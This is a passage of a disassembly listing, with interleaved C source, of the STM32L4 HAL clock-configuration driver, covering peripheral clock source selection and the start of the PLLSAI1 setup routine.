 800496c:	d105      	bne.n	800497a <HAL_RCCEx_PeriphCLKConfig+0x1ca>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 800496e:	4b8a      	ldr	r3, [pc, #552]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004970:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004972:	4a89      	ldr	r2, [pc, #548]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004974:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 8004978:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }

  /*-------------------------- USART1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART1) == RCC_PERIPHCLK_USART1)
 800497a:	687b      	ldr	r3, [r7, #4]
 800497c:	681b      	ldr	r3, [r3, #0]
 800497e:	f003 0301 	and.w	r3, r3, #1
 8004982:	2b00      	cmp	r3, #0
 8004984:	d00a      	beq.n	800499c <HAL_RCCEx_PeriphCLKConfig+0x1ec>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART1CLKSOURCE(PeriphClkInit->Usart1ClockSelection));

    /* Configure the USART1 clock source */
    __HAL_RCC_USART1_CONFIG(PeriphClkInit->Usart1ClockSelection);
 8004986:	4b84      	ldr	r3, [pc, #528]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004988:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800498c:	f023 0203 	bic.w	r2, r3, #3
 8004990:	687b      	ldr	r3, [r7, #4]
 8004992:	6a1b      	ldr	r3, [r3, #32]
 8004994:	4980      	ldr	r1, [pc, #512]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004996:	4313      	orrs	r3, r2
 8004998:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- USART2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART2) == RCC_PERIPHCLK_USART2)
 800499c:	687b      	ldr	r3, [r7, #4]
 800499e:	681b      	ldr	r3, [r3, #0]
 80049a0:	f003 0302 	and.w	r3, r3, #2
 80049a4:	2b00      	cmp	r3, #0
 80049a6:	d00a      	beq.n	80049be <HAL_RCCEx_PeriphCLKConfig+0x20e>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART2CLKSOURCE(PeriphClkInit->Usart2ClockSelection));

    /* Configure the USART2 clock source */
    __HAL_RCC_USART2_CONFIG(PeriphClkInit->Usart2ClockSelection);
 80049a8:	4b7b      	ldr	r3, [pc, #492]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80049aa:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80049ae:	f023 020c 	bic.w	r2, r3, #12
 80049b2:	687b      	ldr	r3, [r7, #4]
 80049b4:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80049b6:	4978      	ldr	r1, [pc, #480]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80049b8:	4313      	orrs	r3, r2
 80049ba:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* UART5 */

  /*-------------------------- LPUART1 clock source configuration ------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPUART1) == RCC_PERIPHCLK_LPUART1)
 80049be:	687b      	ldr	r3, [r7, #4]
 80049c0:	681b      	ldr	r3, [r3, #0]
 80049c2:	f003 0320 	and.w	r3, r3, #32
 80049c6:	2b00      	cmp	r3, #0
 80049c8:	d00a      	beq.n	80049e0 <HAL_RCCEx_PeriphCLKConfig+0x230>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LPUART1CLKSOURCE(PeriphClkInit->Lpuart1ClockSelection));

    /* Configure the LPUART1 clock source */
    __HAL_RCC_LPUART1_CONFIG(PeriphClkInit->Lpuart1ClockSelection);
 80049ca:	4b73      	ldr	r3, [pc, #460]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80049cc:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80049d0:	f423 6240 	bic.w	r2, r3, #3072	; 0xc00
 80049d4:	687b      	ldr	r3, [r7, #4]
 80049d6:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 80049d8:	496f      	ldr	r1, [pc, #444]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80049da:	4313      	orrs	r3, r2
 80049dc:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM1) == (RCC_PERIPHCLK_LPTIM1))
 80049e0:	687b      	ldr	r3, [r7, #4]
 80049e2:	681b      	ldr	r3, [r3, #0]
 80049e4:	f403 7300 	and.w	r3, r3, #512	; 0x200
 80049e8:	2b00      	cmp	r3, #0
 80049ea:	d00a      	beq.n	8004a02 <HAL_RCCEx_PeriphCLKConfig+0x252>
  {
    assert_param(IS_RCC_LPTIM1CLK(PeriphClkInit->Lptim1ClockSelection));
    __HAL_RCC_LPTIM1_CONFIG(PeriphClkInit->Lptim1ClockSelection);
 80049ec:	4b6a      	ldr	r3, [pc, #424]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80049ee:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80049f2:	f423 2240 	bic.w	r2, r3, #786432	; 0xc0000
 80049f6:	687b      	ldr	r3, [r7, #4]
 80049f8:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 80049fa:	4967      	ldr	r1, [pc, #412]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80049fc:	4313      	orrs	r3, r2
 80049fe:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM2) == (RCC_PERIPHCLK_LPTIM2))
 8004a02:	687b      	ldr	r3, [r7, #4]
 8004a04:	681b      	ldr	r3, [r3, #0]
 8004a06:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8004a0a:	2b00      	cmp	r3, #0
 8004a0c:	d00a      	beq.n	8004a24 <HAL_RCCEx_PeriphCLKConfig+0x274>
  {
    assert_param(IS_RCC_LPTIM2CLK(PeriphClkInit->Lptim2ClockSelection));
    __HAL_RCC_LPTIM2_CONFIG(PeriphClkInit->Lptim2ClockSelection);
 8004a0e:	4b62      	ldr	r3, [pc, #392]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a10:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004a14:	f423 1240 	bic.w	r2, r3, #3145728	; 0x300000
 8004a18:	687b      	ldr	r3, [r7, #4]
 8004a1a:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 8004a1c:	495e      	ldr	r1, [pc, #376]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a1e:	4313      	orrs	r3, r2
 8004a20:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- I2C1 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C1) == RCC_PERIPHCLK_I2C1)
 8004a24:	687b      	ldr	r3, [r7, #4]
 8004a26:	681b      	ldr	r3, [r3, #0]
 8004a28:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8004a2c:	2b00      	cmp	r3, #0
 8004a2e:	d00a      	beq.n	8004a46 <HAL_RCCEx_PeriphCLKConfig+0x296>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C1CLKSOURCE(PeriphClkInit->I2c1ClockSelection));

    /* Configure the I2C1 clock source */
    __HAL_RCC_I2C1_CONFIG(PeriphClkInit->I2c1ClockSelection);
 8004a30:	4b59      	ldr	r3, [pc, #356]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a32:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004a36:	f423 5240 	bic.w	r2, r3, #12288	; 0x3000
 8004a3a:	687b      	ldr	r3, [r7, #4]
 8004a3c:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 8004a3e:	4956      	ldr	r1, [pc, #344]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a40:	4313      	orrs	r3, r2
 8004a42:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* I2C2 */

  /*-------------------------- I2C3 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C3) == RCC_PERIPHCLK_I2C3)
 8004a46:	687b      	ldr	r3, [r7, #4]
 8004a48:	681b      	ldr	r3, [r3, #0]
 8004a4a:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8004a4e:	2b00      	cmp	r3, #0
 8004a50:	d00a      	beq.n	8004a68 <HAL_RCCEx_PeriphCLKConfig+0x2b8>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C3CLKSOURCE(PeriphClkInit->I2c3ClockSelection));

    /* Configure the I2C3 clock source */
    __HAL_RCC_I2C3_CONFIG(PeriphClkInit->I2c3ClockSelection);
 8004a52:	4b51      	ldr	r3, [pc, #324]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a54:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004a58:	f423 3240 	bic.w	r2, r3, #196608	; 0x30000
 8004a5c:	687b      	ldr	r3, [r7, #4]
 8004a5e:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8004a60:	494d      	ldr	r1, [pc, #308]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a62:	4313      	orrs	r3, r2
 8004a64:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
#endif /* I2C4 */

#if defined(USB_OTG_FS) || defined(USB)

  /*-------------------------- USB clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USB) == (RCC_PERIPHCLK_USB))
 8004a68:	687b      	ldr	r3, [r7, #4]
 8004a6a:	681b      	ldr	r3, [r3, #0]
 8004a6c:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 8004a70:	2b00      	cmp	r3, #0
 8004a72:	d028      	beq.n	8004ac6 <HAL_RCCEx_PeriphCLKConfig+0x316>
  {
    assert_param(IS_RCC_USBCLKSOURCE(PeriphClkInit->UsbClockSelection));
    __HAL_RCC_USB_CONFIG(PeriphClkInit->UsbClockSelection);
 8004a74:	4b48      	ldr	r3, [pc, #288]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a76:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004a7a:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 8004a7e:	687b      	ldr	r3, [r7, #4]
 8004a80:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8004a82:	4945      	ldr	r1, [pc, #276]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a84:	4313      	orrs	r3, r2
 8004a86:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLL)
 8004a8a:	687b      	ldr	r3, [r7, #4]
 8004a8c:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8004a8e:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 8004a92:	d106      	bne.n	8004aa2 <HAL_RCCEx_PeriphCLKConfig+0x2f2>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 8004a94:	4b40      	ldr	r3, [pc, #256]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a96:	68db      	ldr	r3, [r3, #12]
 8004a98:	4a3f      	ldr	r2, [pc, #252]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a9a:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 8004a9e:	60d3      	str	r3, [r2, #12]
 8004aa0:	e011      	b.n	8004ac6 <HAL_RCCEx_PeriphCLKConfig+0x316>
    }
    else
    {
#if defined(RCC_PLLSAI1_SUPPORT)
      if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLLSAI1)
 8004aa2:	687b      	ldr	r3, [r7, #4]
 8004aa4:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8004aa6:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 8004aaa:	d10c      	bne.n	8004ac6 <HAL_RCCEx_PeriphCLKConfig+0x316>
      {
        /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
        ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 8004aac:	687b      	ldr	r3, [r7, #4]
 8004aae:	3304      	adds	r3, #4
 8004ab0:	2101      	movs	r1, #1
 8004ab2:	4618      	mov	r0, r3
 8004ab4:	f000 f882 	bl	8004bbc <RCCEx_PLLSAI1_Config>
 8004ab8:	4603      	mov	r3, r0
 8004aba:	74fb      	strb	r3, [r7, #19]

        if(ret != HAL_OK)
 8004abc:	7cfb      	ldrb	r3, [r7, #19]
 8004abe:	2b00      	cmp	r3, #0
 8004ac0:	d001      	beq.n	8004ac6 <HAL_RCCEx_PeriphCLKConfig+0x316>
        {
          /* set overall return value */
          status = ret;
 8004ac2:	7cfb      	ldrb	r3, [r7, #19]
 8004ac4:	74bb      	strb	r3, [r7, #18]
  }

#endif /* SDMMC1 */

  /*-------------------------- RNG clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_RNG) == (RCC_PERIPHCLK_RNG))
 8004ac6:	687b      	ldr	r3, [r7, #4]
 8004ac8:	681b      	ldr	r3, [r3, #0]
 8004aca:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 8004ace:	2b00      	cmp	r3, #0
 8004ad0:	d028      	beq.n	8004b24 <HAL_RCCEx_PeriphCLKConfig+0x374>
  {
    assert_param(IS_RCC_RNGCLKSOURCE(PeriphClkInit->RngClockSelection));
    __HAL_RCC_RNG_CONFIG(PeriphClkInit->RngClockSelection);
 8004ad2:	4b31      	ldr	r3, [pc, #196]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004ad4:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004ad8:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 8004adc:	687b      	ldr	r3, [r7, #4]
 8004ade:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 8004ae0:	492d      	ldr	r1, [pc, #180]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004ae2:	4313      	orrs	r3, r2
 8004ae4:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLL)
 8004ae8:	687b      	ldr	r3, [r7, #4]
 8004aea:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 8004aec:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 8004af0:	d106      	bne.n	8004b00 <HAL_RCCEx_PeriphCLKConfig+0x350>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 8004af2:	4b29      	ldr	r3, [pc, #164]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004af4:	68db      	ldr	r3, [r3, #12]
 8004af6:	4a28      	ldr	r2, [pc, #160]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004af8:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 8004afc:	60d3      	str	r3, [r2, #12]
 8004afe:	e011      	b.n	8004b24 <HAL_RCCEx_PeriphCLKConfig+0x374>
    }
#if defined(RCC_PLLSAI1_SUPPORT)
    else if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLLSAI1)
 8004b00:	687b      	ldr	r3, [r7, #4]
 8004b02:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 8004b04:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 8004b08:	d10c      	bne.n	8004b24 <HAL_RCCEx_PeriphCLKConfig+0x374>
    {
      /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 8004b0a:	687b      	ldr	r3, [r7, #4]
 8004b0c:	3304      	adds	r3, #4
 8004b0e:	2101      	movs	r1, #1
 8004b10:	4618      	mov	r0, r3
 8004b12:	f000 f853 	bl	8004bbc <RCCEx_PLLSAI1_Config>
 8004b16:	4603      	mov	r3, r0
 8004b18:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 8004b1a:	7cfb      	ldrb	r3, [r7, #19]
 8004b1c:	2b00      	cmp	r3, #0
 8004b1e:	d001      	beq.n	8004b24 <HAL_RCCEx_PeriphCLKConfig+0x374>
      {
        /* set overall return value */
        status = ret;
 8004b20:	7cfb      	ldrb	r3, [r7, #19]
 8004b22:	74bb      	strb	r3, [r7, #18]
    }
  }

  /*-------------------------- ADC clock source configuration ----------------------*/
#if !defined(STM32L412xx) && !defined(STM32L422xx)
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_ADC) == RCC_PERIPHCLK_ADC)
 8004b24:	687b      	ldr	r3, [r7, #4]
 8004b26:	681b      	ldr	r3, [r3, #0]
 8004b28:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8004b2c:	2b00      	cmp	r3, #0
 8004b2e:	d01c      	beq.n	8004b6a <HAL_RCCEx_PeriphCLKConfig+0x3ba>
  {
    /* Check the parameters */
    assert_param(IS_RCC_ADCCLKSOURCE(PeriphClkInit->AdcClockSelection));

    /* Configure the ADC interface clock source */
    __HAL_RCC_ADC_CONFIG(PeriphClkInit->AdcClockSelection);
 8004b30:	4b19      	ldr	r3, [pc, #100]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004b32:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004b36:	f023 5240 	bic.w	r2, r3, #805306368	; 0x30000000
 8004b3a:	687b      	ldr	r3, [r7, #4]
 8004b3c:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 8004b3e:	4916      	ldr	r1, [pc, #88]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004b40:	4313      	orrs	r3, r2
 8004b42:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

#if defined(RCC_PLLSAI1_SUPPORT)
    if(PeriphClkInit->AdcClockSelection == RCC_ADCCLKSOURCE_PLLSAI1)
 8004b46:	687b      	ldr	r3, [r7, #4]
 8004b48:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 8004b4a:	f1b3 5f80 	cmp.w	r3, #268435456	; 0x10000000
 8004b4e:	d10c      	bne.n	8004b6a <HAL_RCCEx_PeriphCLKConfig+0x3ba>
    {
      /* PLLSAI1 input clock, parameters M, N & R configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_R_UPDATE);
 8004b50:	687b      	ldr	r3, [r7, #4]
 8004b52:	3304      	adds	r3, #4
 8004b54:	2102      	movs	r1, #2
 8004b56:	4618      	mov	r0, r3
 8004b58:	f000 f830 	bl	8004bbc <RCCEx_PLLSAI1_Config>
 8004b5c:	4603      	mov	r3, r0
 8004b5e:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 8004b60:	7cfb      	ldrb	r3, [r7, #19]
 8004b62:	2b00      	cmp	r3, #0
 8004b64:	d001      	beq.n	8004b6a <HAL_RCCEx_PeriphCLKConfig+0x3ba>
      {
        /* set overall return value */
        status = ret;
 8004b66:	7cfb      	ldrb	r3, [r7, #19]
 8004b68:	74bb      	strb	r3, [r7, #18]
#endif /* !STM32L412xx && !STM32L422xx */

#if defined(SWPMI1)

  /*-------------------------- SWPMI1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SWPMI1) == RCC_PERIPHCLK_SWPMI1)
 8004b6a:	687b      	ldr	r3, [r7, #4]
 8004b6c:	681b      	ldr	r3, [r3, #0]
 8004b6e:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 8004b72:	2b00      	cmp	r3, #0
 8004b74:	d00a      	beq.n	8004b8c <HAL_RCCEx_PeriphCLKConfig+0x3dc>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SWPMI1CLKSOURCE(PeriphClkInit->Swpmi1ClockSelection));

    /* Configure the SWPMI1 clock source */
    __HAL_RCC_SWPMI1_CONFIG(PeriphClkInit->Swpmi1ClockSelection);
 8004b76:	4b08      	ldr	r3, [pc, #32]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004b78:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004b7c:	f023 4280 	bic.w	r2, r3, #1073741824	; 0x40000000
 8004b80:	687b      	ldr	r3, [r7, #4]
 8004b82:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8004b84:	4904      	ldr	r1, [pc, #16]	; (8004b98 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004b86:	4313      	orrs	r3, r2
 8004b88:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
    }
  }

#endif /* OCTOSPI1 || OCTOSPI2 */

  return status;
 8004b8c:	7cbb      	ldrb	r3, [r7, #18]
}
 8004b8e:	4618      	mov	r0, r3
 8004b90:	3718      	adds	r7, #24
 8004b92:	46bd      	mov	sp, r7
 8004b94:	bd80      	pop	{r7, pc}
 8004b96:	bf00      	nop
 8004b98:	40021000 	.word	0x40021000

08004b9c <HAL_RCCEx_EnableMSIPLLMode>:
  * @note   Prior to enable the PLL-mode of the MSI for automatic hardware
  *         calibration LSE oscillator is to be enabled with HAL_RCC_OscConfig().
  * @retval None
  */
void HAL_RCCEx_EnableMSIPLLMode(void)
{
 8004b9c:	b480      	push	{r7}
 8004b9e:	af00      	add	r7, sp, #0
  SET_BIT(RCC->CR, RCC_CR_MSIPLLEN) ;
 8004ba0:	4b05      	ldr	r3, [pc, #20]	; (8004bb8 <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 8004ba2:	681b      	ldr	r3, [r3, #0]
 8004ba4:	4a04      	ldr	r2, [pc, #16]	; (8004bb8 <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 8004ba6:	f043 0304 	orr.w	r3, r3, #4
 8004baa:	6013      	str	r3, [r2, #0]
}
 8004bac:	bf00      	nop
 8004bae:	46bd      	mov	sp, r7
 8004bb0:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004bb4:	4770      	bx	lr
 8004bb6:	bf00      	nop
 8004bb8:	40021000 	.word	0x40021000

08004bbc <RCCEx_PLLSAI1_Config>:
  * @note   PLLSAI1 is temporary disable to apply new parameters
  *
  * @retval HAL status
  */
static HAL_StatusTypeDef RCCEx_PLLSAI1_Config(RCC_PLLSAI1InitTypeDef *PllSai1, uint32_t Divider)
{
 8004bbc:	b580      	push	{r7, lr}
 8004bbe:	b084      	sub	sp, #16
 8004bc0:	af00      	add	r7, sp, #0
 8004bc2:	6078      	str	r0, [r7, #4]
 8004bc4:	6039      	str	r1, [r7, #0]
  uint32_t tickstart;
  HAL_StatusTypeDef status = HAL_OK;
 8004bc6:	2300      	movs	r3, #0
 8004bc8:	73fb      	strb	r3, [r7, #15]
  assert_param(IS_RCC_PLLSAI1M_VALUE(PllSai1->PLLSAI1M));
  assert_param(IS_RCC_PLLSAI1N_VALUE(PllSai1->PLLSAI1N));
  assert_param(IS_RCC_PLLSAI1CLOCKOUT_VALUE(PllSai1->PLLSAI1ClockOut));

  /* Check that PLLSAI1 clock source and divider M can be applied */
  if(__HAL_RCC_GET_PLL_OSCSOURCE() != RCC_PLLSOURCE_NONE)
 8004bca:	4b74      	ldr	r3, [pc, #464]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004bcc:	68db      	ldr	r3, [r3, #12]
 8004bce:	f003 0303 	and.w	r3, r3, #3
 8004bd2:	2b00      	cmp	r3, #0
 8004bd4:	d018      	beq.n	8004c08 <RCCEx_PLLSAI1_Config+0x4c>
  {
    /* PLL clock source and divider M already set, check that no request for change  */
    if((__HAL_RCC_GET_PLL_OSCSOURCE() != PllSai1->PLLSAI1Source)
 8004bd6:	4b71      	ldr	r3, [pc, #452]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004bd8:	68db      	ldr	r3, [r3, #12]
 8004bda:	f003 0203 	and.w	r2, r3, #3
 8004bde:	687b      	ldr	r3, [r7, #4]
 8004be0:	681b      	ldr	r3, [r3, #0]
 8004be2:	429a      	cmp	r2, r3
 8004be4:	d10d      	bne.n	8004c02 <RCCEx_PLLSAI1_Config+0x46>
       ||
       (PllSai1->PLLSAI1Source == RCC_PLLSOURCE_NONE)
 8004be6:	687b      	ldr	r3, [r7, #4]
 8004be8:	681b      	ldr	r3, [r3, #0]
       ||
 8004bea:	2b00      	cmp	r3, #0
 8004bec:	d009      	beq.n	8004c02 <RCCEx_PLLSAI1_Config+0x46>
#if !defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
       ||
       (((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U) != PllSai1->PLLSAI1M)
 8004bee:	4b6b      	ldr	r3, [pc, #428]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004bf0:	68db      	ldr	r3, [r3, #12]
 8004bf2:	091b      	lsrs	r3, r3, #4
 8004bf4:	f003 0307 	and.w	r3, r3, #7
 8004bf8:	1c5a      	adds	r2, r3, #1
 8004bfa:	687b      	ldr	r3, [r7, #4]
 8004bfc:	685b      	ldr	r3, [r3, #4]
       ||
 8004bfe:	429a      	cmp	r2, r3
 8004c00:	d047      	beq.n	8004c92 <RCCEx_PLLSAI1_Config+0xd6>
#endif
      )
    {
      status = HAL_ERROR;
 8004c02:	2301      	movs	r3, #1
 8004c04:	73fb      	strb	r3, [r7, #15]
 8004c06:	e044      	b.n	8004c92 <RCCEx_PLLSAI1_Config+0xd6>
    }
  }
  else
  {
    /* Check PLLSAI1 clock source availability */
    switch(PllSai1->PLLSAI1Source)
 8004c08:	687b      	ldr	r3, [r7, #4]
 8004c0a:	681b      	ldr	r3, [r3, #0]
 8004c0c:	2b03      	cmp	r3, #3
 8004c0e:	d018      	beq.n	8004c42 <RCCEx_PLLSAI1_Config+0x86>
 8004c10:	2b03      	cmp	r3, #3
 8004c12:	d825      	bhi.n	8004c60 <RCCEx_PLLSAI1_Config+0xa4>
 8004c14:	2b01      	cmp	r3, #1
 8004c16:	d002      	beq.n	8004c1e <RCCEx_PLLSAI1_Config+0x62>
 8004c18:	2b02      	cmp	r3, #2
 8004c1a:	d009      	beq.n	8004c30 <RCCEx_PLLSAI1_Config+0x74>
 8004c1c:	e020      	b.n	8004c60 <RCCEx_PLLSAI1_Config+0xa4>
    {
    case RCC_PLLSOURCE_MSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_MSIRDY))
 8004c1e:	4b5f      	ldr	r3, [pc, #380]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c20:	681b      	ldr	r3, [r3, #0]
 8004c22:	f003 0302 	and.w	r3, r3, #2
 8004c26:	2b00      	cmp	r3, #0
 8004c28:	d11d      	bne.n	8004c66 <RCCEx_PLLSAI1_Config+0xaa>
      {
        status = HAL_ERROR;
 8004c2a:	2301      	movs	r3, #1
 8004c2c:	73fb      	strb	r3, [r7, #15]
      }
      break;
 8004c2e:	e01a      	b.n	8004c66 <RCCEx_PLLSAI1_Config+0xaa>
    case RCC_PLLSOURCE_HSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSIRDY))
 8004c30:	4b5a      	ldr	r3, [pc, #360]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c32:	681b      	ldr	r3, [r3, #0]
 8004c34:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8004c38:	2b00      	cmp	r3, #0
 8004c3a:	d116      	bne.n	8004c6a <RCCEx_PLLSAI1_Config+0xae>
      {
        status = HAL_ERROR;
 8004c3c:	2301      	movs	r3, #1
 8004c3e:	73fb      	strb	r3, [r7, #15]
      }
      break;
 8004c40:	e013      	b.n	8004c6a <RCCEx_PLLSAI1_Config+0xae>
    case RCC_PLLSOURCE_HSE:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSERDY))
 8004c42:	4b56      	ldr	r3, [pc, #344]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c44:	681b      	ldr	r3, [r3, #0]
 8004c46:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8004c4a:	2b00      	cmp	r3, #0
 8004c4c:	d10f      	bne.n	8004c6e <RCCEx_PLLSAI1_Config+0xb2>
      {
        if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSEBYP))
